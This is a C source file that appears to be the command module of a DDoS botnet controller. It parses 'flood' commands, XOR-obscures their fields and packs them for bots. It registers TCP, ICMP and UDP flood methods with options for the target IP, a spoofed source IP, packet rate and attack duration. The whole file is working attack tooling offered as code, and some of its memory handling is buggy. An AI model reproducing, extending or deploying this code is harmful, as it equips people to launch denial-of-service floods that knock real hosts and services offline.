#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "util.h"
#include "command.h"

void command_zero(struct command *cmd)
{
    cmd->bit_shift = 0;
    cmd->command_id = 0;
    cmd->args_len = 0;
    cmd->attack_id = 0;
}

void command_enc_switch(struct command *cmd)
{
    cmd->command_id = cmd->command_id ^ cmd->bit_shift;
    cmd->args_len = cmd->args_len ^ cmd->bit_shift;
    cmd->attack_id = cmd->attack_id ^ cmd->bit_shift;
}

void command_add(char *name, uint16_t id, uint16_t retid)
{
    if (strlen(name) > 16 || id > METHOD_COUNT || retid > METHOD_COUNT)
        return;

    methods[id].name = malloc(sizeof(strlen(name) + 1));
    strcpy(methods[id].name, name);
    methods[id].id = (uint16_t)id;
    methods[id].retid = (uint16_t)retid;

#ifdef DEBUG
    printf("[command] added %s command with id %d and retid %d\r\n", methods[id].name, methods[id].id, methods[id].retid);
#endif
}

void argument_add(char *name, uint16_t id, uint16_t type, char *desc)
{
    if (strlen(name) > 16 || id > ARGUMENT_COUNT || type > 3)
        return;

    cmdargument[id].name = malloc(sizeof(strlen(name) + 1));
    strcpy(cmdargument[id].name, name);
    cmdargument[id].arg_id = (uint16_t)id;
    cmdargument[id].data_type = (uint16_t)type;
    strcpy(cmdargument[id].desc, desc);

#ifdef DEBUG
    printf("[command] added %s argument with id %d and type %d\r\n", cmdargument[id].name, cmdargument[id].arg_id, cmdargument[id].data_type);
#endif
}

int command_argument_parse(char *buf, int len)
{
    struct arg arg;

    memcpy(&arg.data_type, buf + len, sizeof(uint16_t));
    memcpy(&arg.data_len, buf + len + sizeof(uint16_t), sizeof(uint16_t));
    memcpy(&arg.arg_id, buf + len + (sizeof(uint16_t) * 2), sizeof(uint16_t));

    switch (arg.data_type)
    {
        case TYPE_CHAR:
        {
            arg.ctype = malloc(arg.data_len + 1);
            memcpy(arg.ctype, buf + len + (sizeof(uint16_t) * 3), arg.data_len);
            arg.ctype[arg.data_len] = '\0';
#ifdef DEBUG
            printf("[command] argument %s set to %s\r\n", cmdargument[arg.arg_id].name, arg.ctype);
#endif
        }
        break;

        case TYPE_UINT16T:
        {
            memcpy(&arg.u16type, buf + len + (sizeof(uint16_t) * 3), sizeof(uint16_t));
#ifdef DEBUG
            printf("[command] argument %s set to %d\r\n", cmdargument[arg.arg_id].name, arg.u16type);
#endif
        }
        break;

        default:
            break;
    }

    if (arg.data_type == TYPE_CHAR)
        return ((sizeof(uint16_t) * 5) + arg.data_len);
    else if (arg.data_type == TYPE_UINT16T)
        return (sizeof(uint16_t) * 4);
    else
        return -1;
}

int command_append_arg(char *buf, char *target, int len, uint16_t bit_shift)
{
    struct arg cmdarg;
    char **arguments, srcip[17];
    int argument_len = util_split(buf, '=', &arguments), i, rand_rg;

    if (argument_len != 2)
    {
        util_split_free(arguments, argument_len);
        return -1;
    }

    if (strlen(arguments[0]) < 1 || strlen(arguments[1]) < 1)
    {
        util_split_free(arguments, argument_len);
        return -1;
    }

    cmdarg.arg_id = 0;

    for (i = 0; i < (sizeof(cmdargument) / sizeof(cmdargument[0])); i++)
    {
        if (strcmp(cmdargument[i].name, arguments[0]) != 0)
            continue;

        cmdarg.arg_id = (uint16_t)cmdargument[i].arg_id;
        cmdarg.data_type = (uint16_t)cmdargument[i].data_type;
        break;
    }

    cmdarg.data_len = (uint16_t)strlen(arguments[1]);

    if (cmdarg.arg_id == 0)
    {
#ifdef DEBUG
        printf("[command] failed to find argument id\r\n");
#endif
        util_split_free(arguments, argument_len);
        return -1;
    }

    switch (cmdarg.data_type)
    {
        case TYPE_CHAR:
        {
            char formatted_buf[256];
            cmdarg.ctype = malloc(cmdarg.data_len + 1);
            if (rand_rg == 1)
                strcpy(cmdarg.ctype, srcip);
            else
                strcpy(cmdarg.ctype, arguments[1]);

            if (strlen(cmdarg.ctype) > 256)
            {
#ifdef DEBUG
                printf("[command] data is to large\r\n");
#endif
                util_split_free(arguments, argument_len);
                return -1;
            }

            cmdarg.ctype = util_replace(cmdarg.ctype, "\\n", "\n");
            cmdarg.ctype = util_replace(cmdarg.ctype, "\\r", "\r");
            cmdarg.ctype = util_replace(cmdarg.ctype, "\"", "");
            cmdarg.ctype = util_replace(cmdarg.ctype, "{rand::8}", util_random(8));
            cmdarg.ctype = util_replace(cmdarg.ctype, "{rand::16}", util_random(16));
            cmdarg.ctype = util_replace(cmdarg.ctype, "{rand::24}", util_random(24));
            cmdarg.ctype = util_replace(cmdarg.ctype, "{rand::32}", util_random(32));
            cmdarg.data_len = strlen(cmdarg.ctype);

#ifdef DEBUG
            printf("[command] argument %s selected with value %s (command len = %d)\r\n", cmdargument[cmdarg.arg_id].name, cmdarg.ctype, cmdarg.data_len);
#endif
            memcpy(target + len, &cmdarg.data_type, sizeof(uint16_t));
            memcpy(target + len + sizeof(uint16_t), &cmdarg.data_len, sizeof(uint16_t));
            memcpy(target + len + (sizeof(uint16_t) * 2), &cmdarg.arg_id, sizeof(uint16_t));
            memcpy(target + len + (sizeof(uint16_t) * 3), cmdarg.ctype, cmdarg.data_len);
            free(cmdarg.ctype);
        }
        break;

        case TYPE_UINT16T:
        {
            cmdarg.ctype = malloc(cmdarg.data_len + 1);
            strcpy(cmdarg.ctype, arguments[1]);
            cmdarg.u16type = atoi(cmdarg.ctype);
            cmdarg.data_len = 1;
#ifdef DEBUG
            printf("[command] argument %s selected with value %s (command len = %d)\r\n", cmdargument[cmdarg.arg_id].name, arguments[1], cmdarg.data_len);
#endif
            memcpy(target + len, &cmdarg.data_type, sizeof(uint16_t));
            memcpy(target + len + sizeof(uint16_t), &cmdarg.data_len, sizeof(uint16_t));
            memcpy(target + len + (sizeof(uint16_t) * 2), &cmdarg.arg_id, sizeof(uint16_t));
            memcpy(target + len + (sizeof(uint16_t) * 3), &cmdarg.u16type, sizeof(uint16_t));
            free(cmdarg.ctype);
        }
        break;

        default:
            break;
    }

    util_split_free(arguments, argument_len);

    if (cmdarg.data_type == TYPE_CHAR)
        return ((sizeof(uint16_t) * 5) + cmdarg.data_len);
    else if (cmdarg.data_type == TYPE_UINT16T)
        return (sizeof(uint16_t) * 4);
    else
        return -1;
}

int command_parse(char *buf, char *sendbuf)
{
    struct command attack;
    char **arguments;
    int argument_len = util_split(buf, ' ', &arguments), i, length;

#ifdef DEBUG
    printf("[command] parsing command with %d arguments\r\n", argument_len);
#endif

    if (strcmp(arguments[0], "flood") != 0)
    {
        command_zero(&attack);
        util_split_free(arguments, argument_len);
        return 0;
    }

    if (argument_len < 2)
    {
#ifdef DEBUG
        printf("[command] not enough arguments to command\r\n");
#endif
        command_zero(&attack);
        util_split_free(arguments, argument_len);
        return 0;
    }

    srand(time(NULL));
    attack.bit_shift = rand() % 1024;
    attack.command_id = CMD_ATTACK;
    attack.args_len = (uint16_t)(argument_len - 1);

    command_enc_switch(&attack);
    memcpy(sendbuf, &attack.bit_shift, sizeof(uint16_t));
    memcpy(sendbuf + sizeof(uint16_t), &attack.command_id, sizeof(uint16_t));
    memcpy(sendbuf + (sizeof(uint16_t) * 2), &attack.args_len, sizeof(uint16_t));

    length = 0;

    for (i = 0; i < (argument_len - 1); i++)
    {
        int ret = command_append_arg(arguments[i + 1], sendbuf, (sizeof(uint16_t) * 3) + length, attack.bit_shift);
        if (ret == -1)
        {
            command_zero(&attack);
            util_split_free(arguments, argument_len);
            return 0;
        }

        length += ret;
    }

#ifdef DEBUG
    printf("[command] encrypted command has been built (%d, %d, %d)\r\n", attack.bit_shift, attack.command_id, attack.args_len);
    command_enc_switch(&attack);
    printf("[command] verifying decrypted values (%d, %d, %d)\r\n", attack.bit_shift, attack.command_id, attack.args_len);
#endif

    command_zero(&attack);
    util_split_free(arguments, argument_len);
    return (sizeof(uint16_t) * 3) + length;
}


void command_attacks_init(void)
{
    command_add("tcpraw\0", 0, 1);
    command_add("icmpecho\0", 1, 2);
    command_add("udpplain\0", 2, 3);
}

void command_args_init(void)
{
    argument_add("NULL\0", 0, TYPE_UINT16T, "");
    argument_add("target\0", ARG_TARGET, TYPE_CHAR, "attack target (ip adress)");
    argument_add("port\0", ARG_PORT, TYPE_UINT16T, "attack port (random if left out)");
    argument_add("len\0", ARG_LEN, TYPE_UINT16T, "length of random data");
    argument_add("srcip\0", ARG_SCRIP, TYPE_CHAR, "source ip adress (spoof only)");
    argument_add("payload\0", ARG_PAYLOAD, TYPE_CHAR, "data payload (use quotes if payload has a space)");
    argument_add("method\0", ARG_METHOD, TYPE_CHAR, "attack method (tcpraw, icmpecho, udpplain)");
    argument_add("time\0", ARG_DURATION, TYPE_UINT16T, "attack duration (in seconds)");
    argument_add("repeat\0", ARG_REPEAT, TYPE_UINT16T, "amount of times to repeat packet before reconnection");
    argument_add("minpps\0", ARG_MINPPS, TYPE_UINT16T, "minimum packets per second (set along-side maxpps)");
    argument_add("maxpps\0", ARG_MAXPPS, TYPE_UINT16T, "maximum packets per second (set along-side minpps)");
    argument_add("minlen\0", ARG_MINLEN, TYPE_UINT16T, "minimum length of random data (set along-side maxlen)");
    argument_add("maxlen\0", ARG_MAXLEN, TYPE_UINT16T, "maximum length of random data (set along-side minlen)");
    argument_add("rand\0", ARG_RAND, TYPE_UINT16T, "randomize each packet with random data");
}
